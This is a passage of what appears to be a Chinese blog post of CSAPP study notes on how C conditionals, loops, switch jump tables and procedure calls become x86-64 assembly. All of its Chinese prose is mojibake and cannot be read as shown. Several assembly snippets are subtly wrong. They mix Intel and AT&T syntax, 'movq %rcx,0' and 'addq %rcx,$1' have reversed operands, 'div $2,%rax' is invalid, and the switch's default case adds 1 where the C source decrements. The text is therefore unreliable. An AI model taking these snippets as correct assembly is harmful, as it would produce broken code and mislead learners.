id="æ¡ä»¶åˆ†æ”¯çš„å®ç°"><a href="#æ¡ä»¶åˆ†æ”¯çš„å®ç°" class="headerlink" title="æ¡ä»¶åˆ†æ”¯çš„å®ç°"></a>æ¡ä»¶åˆ†æ”¯çš„å®ç°</h4><p>æ¡ä»¶åˆ†æ”¯æ˜¯ç¼–ç¨‹ä¸­å¸¸ç”¨çš„ä¸€ç§æ§åˆ¶ç»“æ„ï¼Œå®ƒå…è®¸æ ¹æ®æ¡ä»¶çš„æˆç«‹ä¸å¦æ¥æ‰§è¡Œä¸åŒçš„ä»£ç è·¯å¾„ã€‚æ¡ä»¶åˆ†æ”¯é€šå¸¸å¯ä»¥é€šè¿‡ä¸¤ç§ä¸»è¦æ–¹æ³•æ¥å®ç°ï¼šæ¡ä»¶æ§åˆ¶å’Œæ¡ä»¶ä¼ é€è¯­å¥ã€‚</p><h5 id="æ¡ä»¶æ§åˆ¶æ¥å®ç°æ¡ä»¶åˆ†æ”¯"><a href="#æ¡ä»¶æ§åˆ¶æ¥å®ç°æ¡ä»¶åˆ†æ”¯" class="headerlink" title="æ¡ä»¶æ§åˆ¶æ¥å®ç°æ¡ä»¶åˆ†æ”¯"></a>æ¡ä»¶æ§åˆ¶æ¥å®ç°æ¡ä»¶åˆ†æ”¯</h5><p>åœ¨æ¡ä»¶æ§åˆ¶ä¸­ï¼Œç¨‹åºä½¿ç”¨æ¡ä»¶è¯­å¥ï¼ˆå¦‚ <code>if</code>ã€<code>else if</code> ã€<code>else</code> ï¼‰æ¥æ£€æŸ¥ä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œå¹¶åŸºäºè¿™äº›æ¡ä»¶çš„çœŸå‡æ¥é€‰æ‹©æ‰§è¡Œä¸åŒçš„ä»£ç å—ã€‚</p><p>æ¡ä»¶æ§åˆ¶é€šå¸¸ä½¿ç”¨åˆ†æ”¯æŒ‡ä»¤ï¼ˆå¦‚æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼‰æ¥å®ç°ï¼Œä¾‹å¦‚ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œ<code>jz</code>ï¼ˆè·³è½¬å¦‚æœé›¶ï¼‰ã€<code>jnz</code>ï¼ˆè·³è½¬å¦‚æœä¸ä¸ºé›¶ï¼‰ç­‰æŒ‡ä»¤å¯ç”¨äºæ ¹æ®æ¡ä»¶è·³è½¬åˆ°ä¸åŒçš„ä»£ç æ®µã€‚</p><p>æ¡ä»¶æ§åˆ¶çš„ä¸€ä¸ªå…¸å‹ç¤ºä¾‹æ˜¯ä½¿ç”¨ <code>if </code>è¯­å¥æ¥æ ¹æ®æ¡ä»¶æ‰§è¡Œä¸åŒçš„ä»£ç å—ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>åœ¨æ±‡ç¼–ä»£ç ä¸­æˆ‘ä»¬å°±å¯ä»¥å†™æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    cmp rdi, rsi     ; æ¯”è¾ƒ x å’Œ y<br>    jg L1      ; å¦‚æœ x &gt; yï¼Œåˆ™è·³è½¬åˆ° greater<br>    mov rax, 0      ; å¦åˆ™ï¼Œå°† 0 å­˜å‚¨åœ¨ %rax ä¸­<br>    jmp done<br>L1:<br>    mov rax, 1      ; å¦‚æœ x &gt; yï¼Œåˆ™å°† 1 å­˜å‚¨åœ¨ %rax ä¸­<br>done:<br>    ; è¿”å›ç»“æœå¹¶é€€å‡º<br>    ret<br></code></pre></td></tr></table></figure><h5 id="æ¡ä»¶ä¼ é€è¯­å¥å®ç°æ¡ä»¶åˆ†æ”¯"><a href="#æ¡ä»¶ä¼ é€è¯­å¥å®ç°æ¡ä»¶åˆ†æ”¯" class="headerlink" title="æ¡ä»¶ä¼ é€è¯­å¥å®ç°æ¡ä»¶åˆ†æ”¯"></a>æ¡ä»¶ä¼ é€è¯­å¥å®ç°æ¡ä»¶åˆ†æ”¯</h5><p>æ¡ä»¶ä¼ é€è¯­å¥æ˜¯ä¸€ç§é€šè¿‡æ¡ä»¶æ¥é€‰æ‹©æ˜¯å¦å°†ä¸€ä¸ªå€¼ä¼ é€åˆ°ç›®æ ‡å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®çš„æœºåˆ¶ï¼Œä½¿ç”¨æ•°æ®å®ç°æ¡ä»¶è½¬ç§»ã€‚å®ƒé€šå¸¸ç”¨äºæ‰§è¡Œéå¸¸ç®€å•çš„æ¡ä»¶åˆ†æ”¯ï¼Œå…¶ä¸­åªæœ‰ä¸¤ä¸ªå¯èƒ½çš„ç»“æœã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    result=x-y;<br>&#125; <br><span class="hljs-keyword">else</span><br>&#123;<br>    result=y-x;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ±‡ç¼–ä»£ç ä¸­æˆ‘ä»¬å°±å¯ä»¥å†™æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   movq %rdi,%rax<br>   subq %rsi,%rax          ;let %rax=x-y<br>   movq %rsi,%rbx<br>   subq %rdi,%rbx          ;let %rbx=y-x<br>cmp %rsi,%rdi<br>cmovle %rbx,%rax        ;if x&lt;=y movq %rbx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>æ³¨æ„è§‚å¯Ÿä¸Šé¢çš„æ±‡ç¼–ä»£ç ï¼Œå®ƒä¼šå…ˆæŠŠä¸¤ç§ç»“æœéƒ½ç®—å‡ºæ¥ï¼Œæœ€åå†æ ¹æ®åˆ¤æ–­ç»“æœèµ‹å€¼ã€‚è™½ç„¶è¿™ç§æ–¹æ³•çœ‹ä¸Šå»æ‰§è¡Œçš„æ­¥éª¤æ›´å¤šï¼Œä½†æ˜¯å®é™…ä¸Šå®ƒçš„è¿è¡Œé€Ÿåº¦æ›´å¿«ã€‚</p><h5 id="æ¡ä»¶æ§åˆ¶å’Œæ¡ä»¶ä¼ é€çš„æ¯”è¾ƒ"><a href="#æ¡ä»¶æ§åˆ¶å’Œæ¡ä»¶ä¼ é€çš„æ¯”è¾ƒ" class="headerlink" title="æ¡ä»¶æ§åˆ¶å’Œæ¡ä»¶ä¼ é€çš„æ¯”è¾ƒ"></a>æ¡ä»¶æ§åˆ¶å’Œæ¡ä»¶ä¼ é€çš„æ¯”è¾ƒ</h5><p>å¤„ç†å™¨é€šè¿‡æµæ°´çº¿æ¥è·å¾—é«˜æ€§èƒ½ï¼Œåœ¨æµæ°´çº¿ä¸­ï¼Œæœºå™¨ä¼šé‡å è¿ç»­æŒ‡ä»¤ï¼Œæ¯”å¦‚åœ¨æ‰§è¡ŒæŸä¸€æ¡æŒ‡ä»¤çš„åŒæ—¶ä¼šåŒæ—¶æ‰§è¡Œå®ƒå‰é¢ä¸€æ¡çš„ç®—æœ¯è¿ç®—ã€‚</p><p>åƒå‰é¢çš„æ¡ä»¶ä¼ é€è¯­å¥ä¸­ï¼Œä»–çš„è®¡ç®—æ­¥éª¤æ˜¯åŒæ—¶è¿›è¡Œçš„ï¼›ä½†æ˜¯ç”±äºæ¡ä»¶æ§åˆ¶è¯­å¥åœ¨æ‰§è¡Œå®Œæ¯•ä¹‹å‰ï¼Œä¸èƒ½ç¡®å®šç¨‹åºæ˜¯å¦è¦è·³è½¬ï¼Œä¹Ÿå°±æ— æ³•çŸ¥é“å®ƒæ¥ä¸‹æ¥è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç­‰å¾…æ¡ä»¶è·³è½¬æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•å†æ¬¡å¡«å……æŒ‡ä»¤æµæ°´ä½œä¸šï¼Œé€Ÿåº¦è‡ªç„¶å°±æ…¢äº†ã€‚</p><h3 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h3><p>Cè¯­è¨€ä¸­çš„å¾ˆå¤šå¾ªç¯ä¾‹å¦‚ do-while ã€while å’Œ for ã€‚æ±‡ç¼–ä¸­å¹¶æ²¡æœ‰ç›¸åº”çš„ä»£ç æ¥ç›´æ¥å®ç°è¿™äº›æ“ä½œï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¡ä»¶æµ‹è¯•å’Œè·³è½¬ç»„åˆæ¥å®ç°å¾ªç¯çš„æ•ˆæœã€‚</p><h5 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">do</span>&#123;<br><span class="hljs-comment">//bodyment</span><br>i--;<br>&#125;<br><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>å®ƒå¯¹åº”çš„æ±‡ç¼–ä»£ç å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq $10,%rcx     <br>do:<br>    ;do bodyment<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    jns do<br></code></pre></td></tr></table></figure><p>åŒæ ·ï¼Œå…¶ä»–çš„å¾ªç¯ä¹Ÿæœ‰å¯¹åº”çš„å®ç°æ–¹æ³•</p><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>       i--;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">do:<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    js end<br>    ;do bodyment<br>    jmp do<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rcx,0<br>do:<br>    ;something<br>    addq %rcx,$1<br>    cmpq $10,%rcx<br>    jl do<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œä¸Šæ–¹çš„ä¸‰ä¸ªå¾ªç¯éƒ½å¯ä»¥ç”¨æ¡ä»¶åˆ†æ”¯ä»£ç çš„æ€è·¯å»å®ç°ï¼Œç”±æ§åˆ¶æ¥æ„æˆæœºå™¨ä»£ç ã€‚</p><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p><code>switch</code> è¯­å¥å¯ä»¥æ ¹æ®ä¸€ä¸ªæ•´æ•°ç´¢å¼•å€¼è¿›è¡Œå¤šé‡åˆ†æ”¯ï¼Œå½“å¼€å…³çš„æƒ…å†µæ•°é‡æ¯”è¾ƒå¤šï¼Œå¹¶ä¸”å€¼çš„è·¨åº¦èŒƒå›´æ¯”è¾ƒå°æ—¶ï¼Œä¼šé€šè¿‡ä½¿ç”¨<strong>è·³è½¬è¡¨</strong>æ¥å®ç°ç¨‹åºçš„é«˜æ•ˆæ€§ã€‚</p><p>è·³è½¬è¡¨æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–ç±»ä¼¼æ•°æ®ç»“æ„ï¼Œå…¶ä¸­æ¯ä¸ª <code>case</code> æ ‡ç­¾å¯¹åº”ä¸€ä¸ªè¡¨é¡¹ã€‚æ¯ä¸ªè¡¨é¡¹åŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼šæ¡ä»¶å€¼å’Œè·³è½¬ç›®æ ‡ã€‚åœ¨è·³è½¬çš„åˆ¤æ–­éƒ¨åˆ†ï¼Œç¨‹åºä¼šåœ¨è·³è½¬è¡¨ä¸­ç›´æ¥æŸ¥æ‰¾ <code>switch </code> è¡¨è¾¾å¼çš„å€¼å¯¹åº”çš„æ¡ä»¶å€¼ï¼Œ<strong>åªè¿›è¡Œä¸€æ¬¡åˆ¤æ–­</strong>å°±è·³è½¬åˆ°æŒ‡å®šä½ç½®è¿è¡Œã€‚</p><p>æ¯”å¦‚ä¸‹é¢è¿™æ®µCè¯­è¨€ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">switch_eg</span><span class="hljs-params">(n)</span><br>&#123;<br>    <span class="hljs-type">int</span> val=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">switch</span>(n)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            val+=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            val*=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            val/=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            val--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L1:<br>    .quad .L2<br>    .quad .L3<br>    .quad .L4<br>    .quad .L5<br>    .quad .L6<br><br>switch_eg:<br>    movq $1,%rax<br>    subq $1,%rdi    ;rdi ä¹Ÿå°±æ˜¯ n ï¼Œå…¶å€¼è¦åŒ¹é…è·³è½¬è¡¨çš„ç´¢å¼•<br>    cmpq $3,%rdi<br>    ja L6<br>    jmp *.L1(,%rdi,8)    ;è·³è½¬è¡¨<br>L2:<br>    addq $2,%rax<br>    jmp end<br>L3: <br>    subq $2,%rax<br>    jmp end<br>L4:<br>    mul $2,%rax<br>    jmp end<br>L5:<br>    div $2,%rax<br>    jmp end<br>L6:<br>    addq $1,%rax<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>è¿‡ç¨‹æ˜¯è½¯ä»¶ä¸­å¾ˆé‡è¦çš„æŠ½è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç§å°è£…ä»£ç çš„æ–¹å¼ï¼Œç”¨ä¸€ç»„å‚æ•°å’Œå¯é€‰çš„è¿”å›å€¼å®ç°äº†æŸç§åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­ä¸åŒçš„åœ°æ–¹è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><p>æˆ‘ä»¬å‡è®¾è¿‡ç¨‹ P è°ƒç”¨è¿‡ç¨‹ Q ï¼ŒQ æ‰§è¡Œåè¿”å›åˆ° Pã€‚</p><h4 id="è¿è¡Œæ—¶æ ˆ"><a href="#è¿è¡Œæ—¶æ ˆ" class="headerlink" title="è¿è¡Œæ—¶æ ˆ"></a>è¿è¡Œæ—¶æ ˆ</h4><p>Cè¯­è¨€è¿‡ç¨‹è°ƒç”¨æœºåˆ¶çš„ä¸€ä¸ªå…³é”®ç‰¹æ€§å°±æ˜¯ä½¿ç”¨äº†æ ˆæ•°æ®ç»“æ„æä¾›çš„åè¿›å…ˆå‡ºçš„å†…å­˜ç®¡ç†åŸåˆ™ã€‚</p><p>å½“æŸä¸ªå‡½æ•°è¿è¡Œæ—¶æ‰€éœ€è¦çš„å±€éƒ¨å˜é‡è¶…è¿‡äº†å¯„å­˜å™¨çš„æ•°é‡ï¼Œå°±ä¼šåœ¨æ ˆä¸Šå¼€è¾Ÿç©ºé—´ï¼Œè¿™ä¸ªåœ¨æ ˆä¸Šåˆ†é…çš„ç©ºé—´å°±ç§°ä¸ºè¿™ä¸ªå‡½æ•°çš„æ ˆå¸§ã€‚</p><p>å½“ P è°ƒç”¨ Q æ—¶ï¼Œä¼šæŠŠ P çš„çŠ¶æ€ä¿å­˜èµ·æ¥ï¼Œå¹¶å­˜å‚¨ Q è°ƒç”¨ç»“æŸåçš„è¿”å›åœ°å€ï¼Œè°ƒç”¨å®Œä»¥åå†æ¢å¤åˆ°è°ƒç”¨å‰çš„çŠ¶æ€ã€‚éœ€è¦æ³¨æ„è¿™ä¸ª<strong>è¿”å›åœ°å€å±äº P çš„å¸§çš„ä¸€éƒ¨åˆ†</strong>ã€‚</p><h4 id="è½¬ç§»æ§åˆ¶"><a href="#è½¬ç§»æ§åˆ¶" class="headerlink" title="è½¬ç§»æ§åˆ¶"></a>è½¬ç§»æ§åˆ¶</h4><p>å½“æ§åˆ¶ä»å‡½æ•° P è½¬ç§»åˆ°å‡½æ•° Q åªéœ€è¦æŠŠç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰è®¾ç½®ä¸º Q çš„èµ·å§‹åœ°å€ï¼Œä½†å½“ Q è°ƒç”¨ç»“æŸè¿”å› Pæ—¶ï¼Œå¤„ç†å™¨å¿…é¡»è®°ä½ P åº”è¯¥ç»§ç»­æ‰§è¡Œçš„ä»£ç ä½ç½®ï¼Œè¿™ä¸ªä¿¡æ¯å°±æ˜¯ç”± <code>call</code> æŒ‡ä»¤æ¥è®°å½•çš„ã€‚</p><p><code>call Q</code> æŒ‡ä»¤ç”¨æ¥è°ƒç”¨ Q ï¼ŒåŒæ—¶å®ƒä¼šå°† P å½“å‰çš„åœ°å€ A å‹å…¥æ ˆä¸­ï¼Œå¹¶å°† PC è®¾ç½®ä¸º Q çš„èµ·å§‹åœ°å€ã€‚åœ°å€ A å°±æ˜¯å‡½æ•° Q çš„è¿”å›åœ°å€ï¼Œä¹Ÿæ˜¯ <code>ret</code> æŒ‡ä»¤çš„åœ°å€ã€‚ret æŒ‡ä»¤ç´§è·Ÿåœ¨ call æŒ‡ä»¤ä¹‹åï¼Œä¼šä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€ Aï¼Œå¹¶æŠŠ PC é‡æ–°è®¾ç½®ä¸º A ï¼Œç»§ç»­å‡½æ•° P çš„æ‰§è¡Œã€‚</p><p>call æŒ‡ä»¤å’Œ ret æŒ‡ä»¤çš„ä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>call  <em>Label</em></td><td>è¿‡ç¨‹è°ƒç”¨</td><td>æ§åˆ¶ç¨‹åºè·³è½¬åˆ°è¢«è°ƒç”¨è¿‡ç¨‹çš„æŒ‡ä»¤åœ°å€</td></tr><tr><td>call  *<em>Operand</em></td><td>è¿‡ç¨‹è°ƒç”¨</td><td>æ§åˆ¶ç¨‹åºè·³è½¬åˆ°è¢«è°ƒç”¨è¿‡ç¨‹çš„æŒ‡ä»¤åœ°å€</td></tr><tr><td>ret</td><td>ä»è¿‡ç¨‹è°ƒç”¨ä¸­è¿”å›</td><td>æ§åˆ¶ç¨‹åºè¿”å›åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹</td></tr></tbody></table><p>è¿™ä¸¤ä¸ªæŒ‡ä»¤å¯¹åº”çš„å¯„å­˜å™¨å±‚é¢çš„å˜åŒ–å¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%80.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%802.png"></p><p>call æŒ‡ä»¤æ‰§è¡Œå‰</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%89%8D.png"></p><p>call æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•åï¼Œ<em>rip</em> å¯„å­˜å™¨æŒ‡å‘è°ƒç”¨çš„å‡½æ•° <code>foo()</code> çš„åœ°å€ <code>0x4004e7</code>ï¼Œæ­¤æ—¶ <em>rsp</em> æŒ‡å‘è¿”å›åœ°å€ <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%90%8E.png"></p><p>ret æ‰§è¡Œå <em>rip</em> å¯„å­˜å™¨æŒ‡å‘åŸæœ¬ <code>foo()</code> å‡½æ•°å¯¹åº”çš„è¿”å›åœ°å€ <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6ret%E5%90%8E.png"></p><h4 id="æ•°æ®ä¼ é€"><a href="#æ•°æ®ä¼ é€" class="headerlink" title="æ•°æ®ä¼ é€"></a>æ•°æ®ä¼ é€</h4><p>åœ¨å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸ä»…è¦æŠŠæ§åˆ¶åœ¨è¿‡ç¨‹ä¸­ä¼ é€’ï¼Œè¿˜éœ€è¦ä¼ é€’æ•°æ®å‚æ•°ã€‚</p><p>åœ¨ x86-64 ä¸­ï¼Œå¤§éƒ¨åˆ†çš„è¿‡ç¨‹é—´çš„æ•°æ®ä¼ é€’æ˜¯é€šè¿‡å¯„å­˜å™¨å®ç°çš„ã€‚å¯„å­˜å™¨æœ€å¤šä¼ é€’å…­ä¸ªæ•´æ•°ï¼Œé¡ºåºæ˜¯ï¼š %rdiï¼Œ%rsiï¼Œ%rdxï¼Œ%rcxï¼Œ%r8ï¼Œ%r9 ï¼Œå…¶ä½™å‚æ•°è‡ªå³å‘å·¦ä¾æ¬¡å…¥æ ˆã€‚</p><h4 id="æ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨"><a href="#æ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨" class="headerlink" title="æ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨"></a>æ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨</h4><p>æœ‰ä¸€äº›å±€éƒ¨æ•°æ®å¿…é¡»æ”¾åœ¨å†…å­˜ä¸­ï¼Œå…·ä½“æƒ…å†µå¦‚ä¸‹ï¼š</p><ul><li>å¯„å­˜å™¨ä¸è¶³ä»¥å­˜æ”¾æ‰€æœ‰çš„æœ¬åœ°æ•°æ®</li><li>å¯¹å±€éƒ¨å˜é‡ä½¿ç”¨åœ°å€è¿ç®—ç¬¦ <code>&amp;</code> è¿›è¡Œå–åœ°å€æ“ä½œ</li><li>å˜é‡æ˜¯æ•°ç»„æˆ–ç»“æ„ï¼Œå¿…é¡»é€šè¿‡å¼•ç”¨æ¥è®¿é—®</li></ul><h4 id="å¯„å­˜å™¨ä¸­çš„å±€éƒ¨å­˜å‚¨ç©ºé—´"><a href="#å¯„å­˜å™¨ä¸­çš„å±€éƒ¨å­˜å‚¨ç©ºé—´" class="headerlink" title="å¯„å­˜å™¨ä¸­çš„å±€éƒ¨å­˜å‚¨ç©ºé—´"></a>å¯„å­˜å™¨ä¸­çš„å±€éƒ¨å­˜å‚¨ç©ºé—´</h4><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¯„å­˜å™¨æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­å…±äº«çš„èµ„æºï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯ åœ¨ä¸€ä¸ªè¿‡ç¨‹è°ƒç”¨å¦ä¸€ä¸ªè¿‡ç¨‹æ—¶ï¼Œè¢«è°ƒç”¨è€…ä¸ä¼šè¦†ç›–è°ƒç”¨è€…å°†è¦ä½¿ç”¨çš„å¯„å­˜å™¨çš„å€¼ï¼Œä»¥ä¿è¯è°ƒç”¨ç»“æŸåç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œã€‚å¯¹æ­¤ x86-64 æœ‰ä¸€ç»„ç»Ÿä¸€çš„å¯„å­˜å™¨ä½¿ç”¨æƒ¯ä¾‹ã€‚</p><p> æƒ¯ä¾‹ä¸­ï¼š%rbx,%rbp,%r12~%r15 è¢«åˆ’åˆ†ä¸º<strong>è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨</strong>ï¼Œå°±æ˜¯è¢«è°ƒç”¨å‡½æ•°ä¸å›å»å¾…å˜è¿™äº›å¯„å­˜å™¨çš„å€¼ã€‚è€Œå…¶å®ƒçš„å¯„å­˜å™¨ï¼Œé™¤äº† %rsp éƒ½åˆ†ç±»ä¸º<strong>è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨</strong>ï¼Œä¹Ÿå°±æ˜¯ä»»ä½•å‡½æ•°éƒ½å¯ä»¥æ”¹å˜å®ƒä»¬ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£â€œè°ƒç”¨è€…ä¿å­˜â€è¿™ä¸ªåå­—ï¼ŒQ 